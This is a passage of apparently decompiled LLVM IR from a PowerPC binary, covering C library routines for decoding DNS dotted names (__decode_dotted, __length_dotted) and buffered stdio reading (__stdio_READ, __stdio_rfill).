  %v4_100159cc = add i32 %v1_100159cc, %v0_100159c8
  %v5_100159cc = inttoptr i32 %v4_100159cc to i8*
  store i8 0, i8* %v5_100159cc, align 1
  %v0_100159e8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100159d8

dec_label_pc_100159d4:                            ; preds = %dec_label_pc_10015960, %dec_label_pc_100159bc
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100159d8

dec_label_pc_100159d8:                            ; preds = %dec_label_pc_100159c4, %dec_label_pc_100159d4
  %v0_100159e8 = phi i32 [ %v0_100159e8.pre, %dec_label_pc_100159c4 ], [ -1, %dec_label_pc_100159d4 ]
  store i32 %v0_10015924, i32* %r0.global-to-local, align 4
  ret i32 %v0_100159e8

; uselistorder directives
  uselistorder i32 %v0_100159b014, { 1, 0 }
  uselistorder i32 %v0_100159a0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1001598c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1001595c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_strlen, { 12, 25, 24, 11, 10, 9, 8, 7, 26, 23, 22, 21, 19, 20, 18, 17, 16, 15, 14, 0, 13, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 8, 7, 6, 15, 14, 13, 12, 11, 5, 4, 3, 2, 10, 9, 1, 0 }
  uselistorder i32 46, { 0, 5, 3, 6, 7, 4, 1, 2 }
  uselistorder label %dec_label_pc_100159d8, { 1, 0 }
  uselistorder label %dec_label_pc_100159d4, { 1, 0 }
  uselistorder label %dec_label_pc_100159bc, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100159b0, { 1, 0 }
  uselistorder label %dec_label_pc_10015960, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_100159f0 = call i32 @__asm_mfcr()
  store i32 %v0_100159f0, i32* @r26, align 4
  %v3_100159fc = icmp eq i32 %v0_100159f0, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_10015a0c = load i32, i32* @r6, align 4
  store i32 %v0_10015a0c, i32* @r24, align 4
  br i1 %v3_100159fc, label %dec_label_pc_10015ac4, label %dec_label_pc_10015a14

dec_label_pc_10015a14:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10015aa014 = load i32, i32* @r4, align 4
  %v2_10015aa015 = add i32 %v1_10015aa014, %v0_100159f0
  %v3_10015aa016 = inttoptr i32 %v2_10015aa015 to i8*
  %v4_10015aa017 = load i8, i8* %v3_10015aa016, align 1
  %v5_10015aa018 = zext i8 %v4_10015aa017 to i32
  store i32 %v5_10015aa018, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_10015aa820 = icmp eq i8 %v4_10015aa017, 0
  br i1 %v3_10015aa820, label %dec_label_pc_10015ab4, label %dec_label_pc_10015a24

dec_label_pc_10015a24:                            ; preds = %dec_label_pc_10015a14, %dec_label_pc_10015a9c
  %v3_10015aa422 = phi i1 [ %v3_10015aa4, %dec_label_pc_10015a9c ], [ false, %dec_label_pc_10015a14 ]
  %v5_10015aa021 = phi i32 [ %v5_10015aa0, %dec_label_pc_10015a9c ], [ %v5_10015aa018, %dec_label_pc_10015a14 ]
  br i1 %v3_10015aa422, label %dec_label_pc_10015a2c, label %dec_label_pc_10015a28

dec_label_pc_10015a28:                            ; preds = %dec_label_pc_10015a24
  %v0_10015a28 = load i32, i32* %r27.global-to-local, align 4
  %v1_10015a28 = add i32 %v0_10015a28, 1
  store i32 %v1_10015a28, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10015a2c

dec_label_pc_10015a2c:                            ; preds = %dec_label_pc_10015a24, %dec_label_pc_10015a28
  %v1_10015a2c = call i32 @__asm_rlwinm(i32 %v5_10015aa021, i32 0, i32 24, i32 25)
  %v0_10015a30 = load i32, i32* @r4, align 4
  %v1_10015a30 = add i32 %v0_10015a30, 1
  store i32 %v1_10015a30, i32* @r30, align 4
  %v3_10015a34 = icmp eq i32 %v1_10015a2c, 192
  br i1 %v3_10015a34, label %dec_label_pc_10015a3c, label %dec_label_pc_10015a5c

dec_label_pc_10015a3c:                            ; preds = %dec_label_pc_10015a2c
  %v0_10015a3c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10015a3c, label %dec_label_pc_10015a44, label %dec_label_pc_10015a40

dec_label_pc_10015a40:                            ; preds = %dec_label_pc_10015a3c
  %v0_10015a40 = load i32, i32* %r27.global-to-local, align 4
  %v1_10015a40 = add i32 %v0_10015a40, 1
  store i32 %v1_10015a40, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10015a44

dec_label_pc_10015a44:                            ; preds = %dec_label_pc_10015a3c, %dec_label_pc_10015a40
  %v0_10015a44 = load i32, i32* @r26, align 4
  %v2_10015a44 = add i32 %v0_10015a44, %v1_10015a30
  %v3_10015a44 = inttoptr i32 %v2_10015a44 to i8*
  %v4_10015a44 = load i8, i8* %v3_10015a44, align 1
  %v5_10015a44 = zext i8 %v4_10015a44 to i32
  %v1_10015a48 = call i32 @__asm_rlwinm(i32 %v5_10015aa021, i32 8, i32 18, i32 23)
  %v0_10015a4c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10015a4c, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_10015a54 = or i32 %v5_10015a44, %v1_10015a48
  store i32 %v2_10015a54, i32* @r4, align 4
  br label %dec_label_pc_10015a9c

dec_label_pc_10015a5c:                            ; preds = %dec_label_pc_10015a2c
  %v0_10015a5c = load i32, i32* %r11.global-to-local, align 4
  %v2_10015a5c = add i32 %v0_10015a5c, %v5_10015aa021
  store i32 %v2_10015a5c, i32* @r29, align 4
  %v1_10015a60 = add i32 %v2_10015a5c, 1
  store i32 %v1_10015a60, i32* @r28, align 4
  %v1_10015a64 = load i32, i32* @r24, align 4
  %v2_10015a64 = icmp ult i32 %v1_10015a60, %v1_10015a64
  br i1 %v2_10015a64, label %dec_label_pc_10015a6c, label %dec_label_pc_10015ac4

dec_label_pc_10015a6c:                            ; preds = %dec_label_pc_10015a5c
  %v0_10015a6c = load i32, i32* @r26, align 4
  %v2_10015a6c = add i32 %v0_10015a6c, %v1_10015a30
  store i32 %v2_10015a6c, i32* @r4, align 4
  %v0_10015a70 = load i32, i32* @r25, align 4
  %v2_10015a70 = add i32 %v0_10015a70, %v0_10015a5c
  store i32 %v2_10015a70, i32* @r3, align 4
  store i32 %v5_10015aa021, i32* @r5, align 4
  store i32 268524156, i32* @lr, align 4
  %v0_10015a78 = call i32 @memcpy()
  %v0_10015a7c = load i32, i32* @r30, align 4
  %v2_10015a7c = add i32 %v0_10015a7c, %v5_10015aa021
  store i32 %v2_10015a7c, i32* @r4, align 4
  %v0_10015a80 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10015a80, label %dec_label_pc_10015a88, label %dec_label_pc_10015a84

dec_label_pc_10015a84:                            ; preds = %dec_label_pc_10015a6c
  %v0_10015a84 = load i32, i32* %r27.global-to-local, align 4
  %v2_10015a84 = add i32 %v0_10015a84, %v5_10015aa021
  store i32 %v2_10015a84, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10015a88

dec_label_pc_10015a88:                            ; preds = %dec_label_pc_10015a6c, %dec_label_pc_10015a84
  %v0_10015a88 = load i32, i32* @r26, align 4
  %v2_10015a88 = add i32 %v0_10015a88, %v2_10015a7c
  %v3_10015a88 = inttoptr i32 %v2_10015a88 to i8*
  %v4_10015a88 = load i8, i8* %v3_10015a88, align 1
  %v3_10015a8c = icmp eq i8 %v4_10015a88, 0
  br i1 %v3_10015a8c, label %dec_label_pc_10015a98, label %dec_label_pc_10015a94

dec_label_pc_10015a94:                            ; preds = %dec_label_pc_10015a88
  br label %dec_label_pc_10015a98

dec_label_pc_10015a98:                            ; preds = %dec_label_pc_10015a88, %dec_label_pc_10015a94
  %v0_10015a98.off0 = phi i8 [ 0, %dec_label_pc_10015a88 ], [ 46, %dec_label_pc_10015a94 ]
  %v1_10015a98 = load i32, i32* @r25, align 4
  %v2_10015a98 = load i32, i32* @r29, align 4
  %v4_10015a98 = add i32 %v2_10015a98, %v1_10015a98
  %v5_10015a98 = inttoptr i32 %v4_10015a98 to i8*
  store i8 %v0_10015a98.off0, i8* %v5_10015a98, align 1
  %v0_10015a9c.pre = load i32, i32* @r28, align 4
  %v0_10015aa4.pre.pre = load i32, i32* @r23, align 4
  %v1_10015aa0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10015a9c

dec_label_pc_10015a9c:                            ; preds = %dec_label_pc_10015a44, %dec_label_pc_10015a98
  %v1_10015aa0 = phi i32 [ %v2_10015a54, %dec_label_pc_10015a44 ], [ %v1_10015aa0.pre, %dec_label_pc_10015a98 ]
  %v0_10015aa4.pre = phi i32 [ 0, %dec_label_pc_10015a44 ], [ %v0_10015aa4.pre.pre, %dec_label_pc_10015a98 ]
  %v0_10015a9c = phi i32 [ %v0_10015a4c, %dec_label_pc_10015a44 ], [ %v0_10015a9c.pre, %dec_label_pc_10015a98 ]
  %v0_10015aa0.pre = load i32, i32* @r26, align 4
  store i32 %v0_10015a9c, i32* %r11.global-to-local, align 4
  %v2_10015aa0 = add i32 %v1_10015aa0, %v0_10015aa0.pre
  %v3_10015aa0 = inttoptr i32 %v2_10015aa0 to i8*
  %v4_10015aa0 = load i8, i8* %v3_10015aa0, align 1
  %v5_10015aa0 = zext i8 %v4_10015aa0 to i32
  store i32 %v5_10015aa0, i32* @r31, align 4
  %v3_10015aa4 = icmp eq i32 %v0_10015aa4.pre, 0
  store i1 %v3_10015aa4, i1* %cr4_eq.global-to-local, align 1
  %v3_10015aa8 = icmp eq i8 %v4_10015aa0, 0
  br i1 %v3_10015aa8, label %dec_label_pc_10015ab0, label %dec_label_pc_10015a24

dec_label_pc_10015ab0:                            ; preds = %dec_label_pc_10015a9c
  %v0_10015ab8.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_10015aa4, label %dec_label_pc_10015ac4, label %dec_label_pc_10015ab4

dec_label_pc_10015ab4:                            ; preds = %dec_label_pc_10015a14, %dec_label_pc_10015ab0
  %v0_10015ab8.pre26 = phi i32 [ %v0_10015ab8.pre.pre, %dec_label_pc_10015ab0 ], [ 0, %dec_label_pc_10015a14 ]
  %v1_10015ab4 = add i32 %v0_10015ab8.pre26, 1
  store i32 %v1_10015ab4, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10015ac4

dec_label_pc_10015ac4:                            ; preds = %dec_label_pc_10015a5c, %dec_label_pc_10015ab0, %dec_label_pc_10015ab4, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_10015ab4, %dec_label_pc_10015ab4 ], [ %v0_10015ab8.pre.pre, %dec_label_pc_10015ab0 ], [ -1, %dec_label_pc_10015a5c ]
  %v1_10015ad4 = call %1 @__asm_mtcrf(i32 8, i32 %v0_100159f0)
  %v9_10015ad4 = extractvalue %1 %v1_10015ad4, 7
  store i4 %v9_10015ad4, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_10015ab8.pre.pre, { 1, 0 }
  uselistorder i1 %v3_10015aa4, { 0, 2, 1 }
  uselistorder i32 %v5_10015aa0, { 1, 0 }
  uselistorder i32 %v5_10015aa021, { 5, 4, 0, 3, 2, 1 }
  uselistorder i32 %v0_100159f0, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 7, 1, 4, 2, 5, 3, 6, 8 }
  uselistorder i32* %r11.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32 ()* @memcpy, { 17, 16, 15, 14, 13, 4, 3, 6, 5, 2, 24, 12, 11, 0, 7, 1, 10, 9, 8, 23, 22, 21, 20, 19, 18 }
  uselistorder i32* @r5, { 23, 24, 25, 3, 26, 27, 28, 29, 30, 31, 32, 64, 65, 33, 34, 10, 4, 35, 1, 36, 37, 38, 39, 40, 41, 42, 66, 61, 43, 44, 45, 46, 47, 48, 79, 8, 9, 5, 62, 63, 71, 72, 73, 11, 49, 50, 51, 80, 81, 82, 83, 74, 75, 2, 76, 77, 78, 52, 54, 53, 55, 0, 56, 57, 58, 59, 60, 67, 68, 20, 21, 22, 7, 69, 70, 6, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* @r28, { 2, 32, 33, 34, 35, 36, 37, 42, 43, 38, 39, 40, 41, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 17, 3, 16, 18, 19, 20, 21, 22, 23, 54, 58, 55, 56, 57, 1, 59, 60, 61, 4, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 5, 74, 6, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 128, 129, 88, 7, 89, 90, 91, 92, 93, 8, 130, 131, 132, 133, 140, 9, 24, 25, 26, 12, 27, 123, 124, 125, 126, 127, 121, 122, 134, 135, 136, 137, 138, 94, 95, 96, 97, 98, 10, 99, 100, 11, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 0, 117, 118, 13, 14, 15, 119, 120, 139, 30, 31, 28, 29 }
  uselistorder i32 23, { 9, 14, 15, 16, 10, 11, 12, 0, 1, 2, 3, 4, 6, 5, 7, 8, 13 }
  uselistorder i32 18, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* @r30, { 32, 33, 34, 8, 35, 37, 39, 40, 41, 42, 43, 36, 38, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 19, 20, 21, 1, 22, 23, 24, 7, 25, 26, 58, 55, 56, 5, 57, 4, 61, 59, 60, 62, 63, 65, 64, 6, 66, 67, 68, 69, 9, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 17, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 10, 96, 97, 98, 99, 100, 11, 144, 145, 146, 147, 12, 137, 148, 159, 149, 150, 27, 0, 29, 13, 30, 31, 138, 139, 140, 141, 142, 143, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 151, 152, 153, 154, 155, 156, 157, 14, 158, 101, 102, 103, 104, 105, 106, 107, 2, 109, 18, 110, 15, 111, 112, 108, 113, 114, 115, 116, 117, 118, 119, 16, 120, 121, 3, 122, 123, 124, 125, 28 }
  uselistorder i1 false, { 2, 3, 5, 13, 6, 7, 9, 10, 0, 11, 17, 18, 19, 14, 15, 16, 4, 12, 1, 8, 20 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21, 22, 2, 3, 23, 24, 25, 5, 6, 4, 1 }
  uselistorder i32* @r25, { 7, 8, 9, 11, 12, 10, 13, 1, 2, 14, 15, 16, 17, 18, 19, 20, 21, 22, 31, 34, 3, 4, 27, 28, 29, 30, 0, 23, 24, 25, 26, 32, 33, 5, 6 }
  uselistorder i32* @r26, { 1, 12, 13, 14, 15, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 3, 4, 27, 28, 29, 30, 31, 32, 33, 2, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 77, 5, 6, 7, 73, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 45, 46, 47, 48, 49, 50, 52, 51, 53, 54, 55, 56, 57, 58, 59, 60, 0, 75, 76, 10, 11, 8, 9 }
  uselistorder i32 ()* @__asm_mfcr, { 31, 30, 29, 28, 27, 12, 26, 20, 35, 9, 8, 7, 6, 15, 34, 25, 24, 10, 33, 11, 39, 23, 21, 38, 19, 4, 14, 18, 13, 1, 32, 17, 16, 37, 36, 5, 3, 2, 0, 22 }
  uselistorder label %dec_label_pc_10015ac4, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10015ab4, { 1, 0 }
  uselistorder label %dec_label_pc_10015a9c, { 1, 0 }
  uselistorder label %dec_label_pc_10015a98, { 1, 0 }
  uselistorder label %dec_label_pc_10015a88, { 1, 0 }
  uselistorder label %dec_label_pc_10015a44, { 1, 0 }
  uselistorder label %dec_label_pc_10015a2c, { 1, 0 }
  uselistorder label %dec_label_pc_10015a24, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_10015ae0 = load i32, i32* @r3, align 4
  store i32 %v0_10015ae0, i32* %r11.global-to-local, align 4
  %v3_10015ae0 = icmp eq i32 %v0_10015ae0, 0
  %v0_10015ae8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10015ae0, i32 %v0_10015ae8)
  %v0_10015af8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10015b04

dec_label_pc_10015af0:                            ; preds = %dec_label_pc_10015b00
  %v1_10015af0 = add i32 %v1_10015b04, 2
  br label %dec_label_pc_10015b20

dec_label_pc_10015b00:                            ; preds = %dec_label_pc_10015b04
  %v2_10015b18 = add i32 %v1_10015b08, %v5_10015b04
  %v3_10015b14 = icmp eq i32 %v1_10015b10, 192
  br i1 %v3_10015b14, label %dec_label_pc_10015af0, label %dec_label_pc_10015b04

dec_label_pc_10015b04:                            ; preds = %dec_label_pc_10015b00, %entry
  %v1_10015b04 = phi i32 [ %v2_10015b18, %dec_label_pc_10015b00 ], [ %v0_10015af8, %entry ]
  %v0_10015b04 = load i32, i32* %r11.global-to-local, align 4
  %v2_10015b04 = add i32 %v0_10015b04, %v1_10015b04
  %v3_10015b04 = inttoptr i32 %v2_10015b04 to i8*
  %v4_10015b04 = load i8, i8* %v3_10015b04, align 1
  %v5_10015b04 = zext i8 %v4_10015b04 to i32
  %v1_10015b08 = add i32 %v1_10015b04, 1
  %v3_10015b0c = icmp eq i8 %v4_10015b04, 0
  %v1_10015b10 = call i32 @__asm_rlwinm(i32 %v5_10015b04, i32 0, i32 24, i32 25)
  br i1 %v3_10015b0c, label %dec_label_pc_10015b20, label %dec_label_pc_10015b00

dec_label_pc_10015b20:                            ; preds = %dec_label_pc_10015b04, %dec_label_pc_10015af0
  %v1_10015b20 = phi i32 [ %v1_10015af0, %dec_label_pc_10015af0 ], [ %v1_10015b08, %dec_label_pc_10015b04 ]
  %v0_10015b20 = load i32, i32* @r4, align 4
  %v2_10015b20 = sub i32 %v1_10015b20, %v0_10015b20
  ret i32 %v2_10015b20

; uselistorder directives
  uselistorder i32 %v1_10015b08, { 1, 0 }
  uselistorder i32 %v5_10015b04, { 1, 0 }
  uselistorder i32 %v1_10015b04, { 2, 1, 0 }
  uselistorder i32 %v0_10015ae0, { 1, 0 }
  uselistorder i32 25, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i8 0, { 37, 35, 4, 38, 2, 39, 40, 5, 24, 44, 42, 23, 43, 41, 22, 45, 46, 47, 48, 6, 50, 49, 25, 7, 51, 52, 8, 53, 54, 55, 56, 21, 27, 59, 57, 58, 26, 60, 61, 9, 63, 62, 28, 64, 65, 0, 66, 67, 68, 69, 10, 70, 71, 11, 1, 12, 72, 73, 74, 76, 77, 78, 79, 75, 80, 13, 81, 82, 83, 84, 86, 87, 88, 89, 85, 90, 3, 14, 15, 16, 17, 18, 19, 92, 91, 20, 93, 94, 95, 96, 97, 99, 29, 100, 101, 98, 102, 103, 104, 105, 107, 106, 108, 111, 109, 110, 112, 115, 113, 114, 116, 117, 118, 119, 120, 121, 122, 123, 125, 124, 127, 126, 128, 30, 130, 129, 36, 131, 31, 132, 134, 135, 133, 32, 136, 137, 34, 138, 33, 139, 140, 141, 142, 143, 144, 145 }
  uselistorder i32 192, { 1, 2, 3, 4, 0 }
  uselistorder i32 2, { 0, 4, 5, 119, 120, 6, 121, 51, 122, 123, 32, 1, 2, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 7, 136, 8, 104, 105, 106, 33, 31, 137, 138, 139, 140, 141, 52, 53, 54, 142, 143, 144, 145, 146, 166, 44, 9, 10, 3, 55, 147, 11, 12, 34, 42, 148, 149, 13, 150, 151, 152, 56, 57, 58, 110, 59, 111, 60, 112, 167, 35, 14, 15, 61, 62, 63, 64, 65, 16, 49, 50, 66, 67, 162, 48, 169, 17, 18, 36, 37, 38, 39, 40, 68, 164, 165, 41, 153, 154, 155, 19, 20, 21, 22, 23, 156, 157, 24, 159, 160, 161, 30, 158, 69, 25, 26, 168, 170, 70, 107, 72, 73, 71, 74, 108, 109, 75, 76, 27, 77, 78, 28, 45, 79, 80, 81, 82, 46, 84, 85, 83, 86, 88, 87, 89, 90, 92, 93, 91, 94, 95, 96, 113, 114, 115, 116, 117, 97, 43, 118, 98, 99, 100, 101, 102, 163, 47, 29, 103 }
  uselistorder i32* @r4, { 78, 79, 1, 80, 81, 82, 83, 2, 84, 85, 3, 86, 87, 8, 9, 88, 89, 90, 91, 92, 93, 94, 95, 96, 143, 140, 141, 97, 98, 99, 100, 101, 5, 102, 103, 104, 137, 138, 55, 10, 105, 106, 107, 108, 109, 110, 111, 112, 153, 6, 7, 70, 71, 145, 18, 19, 13, 76, 77, 142, 72, 11, 128, 129, 135, 139, 136, 146, 147, 148, 113, 114, 115, 12, 116, 117, 130, 131, 132, 133, 134, 4, 152, 118, 119, 120, 121, 0, 122, 123, 124, 125, 126, 127, 144, 73, 74, 75, 149, 150, 151, 14, 15, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 28, 30, 25, 1, 11, 12, 13, 14, 15, 29, 2, 20, 21, 22, 23, 16, 18, 19, 24, 32, 31, 17, 26, 27 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10015b34 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10015b40 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10015b48 = and i16 %v3_10015b40, 4
  %v3_10015b48 = icmp eq i16 %v1_10015b48, 0
  br i1 %v3_10015b48, label %dec_label_pc_10015b50, label %dec_label_pc_10015b88

dec_label_pc_10015b50:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_10015b5c, label %dec_label_pc_10015b54

dec_label_pc_10015b54:                            ; preds = %dec_label_pc_10015b50
  br label %dec_label_pc_10015b5c

dec_label_pc_10015b5c:                            ; preds = %dec_label_pc_10015b50, %dec_label_pc_10015b54
  %v1_10015b5c = add i32 %tmp, 4
  %v2_10015b5c = inttoptr i32 %v1_10015b5c to i32*
  %v3_10015b5c = load i32, i32* %v2_10015b5c, align 4
  store i32 %v3_10015b5c, i32* %r3.global-to-local, align 4
  store i32 268524388, i32* @lr, align 4
  %v1_10015b60 = call i32 @__libc_read(i32 %v3_10015b5c)
  store i32 %v1_10015b60, i32* %r3.global-to-local, align 4
  %v2_10015b64 = icmp sgt i32 %v1_10015b60, 0
  br i1 %v2_10015b64, label %dec_label_pc_10015b88, label %dec_label_pc_10015b6c

dec_label_pc_10015b6c:                            ; preds = %dec_label_pc_10015b5c
  %v3_10015b64 = icmp eq i32 %v1_10015b60, 0
  %v0_10015b6c = load i32, i32* @r31, align 4
  %v1_10015b6c = inttoptr i32 %v0_10015b6c to i16*
  %v2_10015b6c = load i16, i16* %v1_10015b6c, align 2
  br i1 %v3_10015b64, label %dec_label_pc_10015b74, label %dec_label_pc_10015b7c

dec_label_pc_10015b74:                            ; preds = %dec_label_pc_10015b6c
  %v1_10015b74 = or i16 %v2_10015b6c, 4
  br label %dec_label_pc_10015b84

dec_label_pc_10015b7c:                            ; preds = %dec_label_pc_10015b6c
  %v1_10015b7c = or i16 %v2_10015b6c, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10015b84

dec_label_pc_10015b84:                            ; preds = %dec_label_pc_10015b74, %dec_label_pc_10015b7c
  %v1_10015b74.sink.off0 = phi i16 [ %v1_10015b74, %dec_label_pc_10015b74 ], [ %v1_10015b7c, %dec_label_pc_10015b7c ]
  store i16 %v1_10015b74.sink.off0, i16* %v1_10015b6c, align 2
  %v0_10015b98.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10015b88

dec_label_pc_10015b88:                            ; preds = %entry, %dec_label_pc_10015b5c, %dec_label_pc_10015b84
  %v0_10015b98 = phi i32 [ 0, %entry ], [ %v1_10015b60, %dec_label_pc_10015b5c ], [ %v0_10015b98.pre, %dec_label_pc_10015b84 ]
  store i32 %v0_10015b34, i32* @r31, align 4
  ret i32 %v0_10015b98

; uselistorder directives
  uselistorder i16 %v2_10015b6c, { 1, 0 }
  uselistorder i32 %v1_10015b60, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder i32 4, { 218, 219, 220, 4, 115, 139, 5, 6, 223, 221, 222, 156, 224, 225, 226, 134, 7, 227, 228, 229, 230, 231, 232, 233, 8, 234, 9, 10, 11, 140, 235, 236, 157, 237, 238, 239, 12, 13, 135, 201, 14, 15, 240, 241, 242, 243, 16, 244, 158, 245, 246, 247, 248, 249, 250, 159, 17, 18, 321, 322, 160, 19, 20, 120, 21, 22, 23, 24, 25, 26, 251, 252, 161, 27, 28, 2, 29, 0, 253, 3, 30, 1, 254, 162, 31, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 323, 267, 121, 337, 344, 32, 33, 34, 35, 36, 324, 325, 37, 326, 38, 327, 39, 40, 183, 41, 42, 184, 43, 203, 204, 205, 213, 214, 215, 44, 185, 45, 46, 47, 186, 48, 187, 188, 301, 303, 302, 299, 300, 304, 305, 306, 307, 308, 309, 310, 311, 312, 49, 202, 50, 285, 163, 286, 287, 122, 51, 52, 288, 53, 289, 290, 291, 292, 293, 294, 136, 54, 295, 137, 296, 55, 189, 328, 329, 268, 56, 57, 58, 138, 59, 145, 320, 60, 61, 297, 62, 63, 338, 339, 340, 164, 341, 342, 343, 64, 330, 331, 332, 118, 119, 333, 334, 165, 335, 336, 65, 66, 67, 68, 69, 70, 71, 72, 269, 73, 270, 271, 142, 272, 273, 274, 275, 276, 74, 75, 277, 278, 143, 279, 280, 144, 281, 282, 284, 76, 77, 116, 117, 283, 78, 79, 123, 80, 190, 81, 124, 82, 83, 84, 85, 191, 192, 166, 193, 167, 194, 168, 195, 196, 197, 169, 198, 170, 199, 200, 86, 125, 150, 171, 87, 126, 172, 146, 151, 173, 88, 127, 174, 147, 148, 152, 149, 153, 89, 154, 90, 175, 180, 181, 91, 141, 206, 92, 93, 94, 128, 207, 208, 176, 209, 210, 211, 212, 95, 216, 129, 96, 130, 97, 217, 98, 177, 155, 178, 99, 131, 179, 132, 100, 133, 101, 102, 298, 103, 104, 105, 313, 106, 314, 107, 315, 108, 316, 109, 317, 110, 318, 111, 319, 112, 113, 114, 182 }
  uselistorder i16 0, { 0, 13, 1, 2, 11, 3, 4, 5, 6, 7, 12, 8, 9, 10, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_10015b88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015b84, { 1, 0 }
  uselistorder label %dec_label_pc_10015b5c, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10015b9c = load i32, i32* @lr, align 4
  store i32 %v0_10015b9c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_10015bb0 = add i32 %arg1, 8
  %v2_10015bb0 = inttoptr i32 %v1_10015bb0 to i32*
  %v3_10015bb0 = load i32, i32* %v2_10015bb0, align 4
  %v1_10015bb4 = add i32 %arg1, 12
  %v2_10015bb4 = inttoptr i32 %v1_10015bb4 to i32*
  %v3_10015bb4 = load i32, i32* %v2_10015bb4, align 4
  %v2_10015bb8 = sub i32 %v3_10015bb4, %v3_10015bb0
  store i32 268524480, i32* @lr, align 4
  %v3_10015bbc = inttoptr i32 %v3_10015bb0 to i16*
  %v4_10015bbc = call i32 @__stdio_READ(i16* %v3_10015bbc, i32 %v2_10015bb8, i32 %v2_10015bb8)
  %v0_10015bc0 = load i32, i32* @r29, align 4
  %v1_10015bc0 = add i32 %v0_10015bc0, 8
